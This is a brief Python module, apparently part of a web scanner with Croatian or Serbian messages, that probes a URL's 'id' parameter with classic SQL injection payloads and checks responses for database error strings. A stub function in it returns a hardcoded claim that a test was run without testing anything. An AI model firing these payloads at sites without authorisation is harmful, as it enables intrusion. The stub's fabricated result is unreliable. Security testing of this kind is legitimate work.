import requests
def scan(target):
    return {
        "target": target,
        "test": "sql_injection",
        "result": "Testiran SQL payload.",
        "payload": "' OR '1'='1",
        "notes": "SQL Injection test izvršen"
    }
sql_payloads = ["'", "' OR '1'='1", "';--", "\" OR \"1\"=\"1", "1 OR 1=1"]

error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

def sql_injector(target):
    for payload in sql_payloads:
        try:
            response = requests.get(target, params={"id": payload}, timeout=5)
            content = response.text.lower()
            for error in error_signatures:
                if error in content:
                    return f"VULNERABLE: SQLi detected with payload: {payload}"
        except Exception as e:
            return f"Greška: {str(e)}"
    return "Clean"
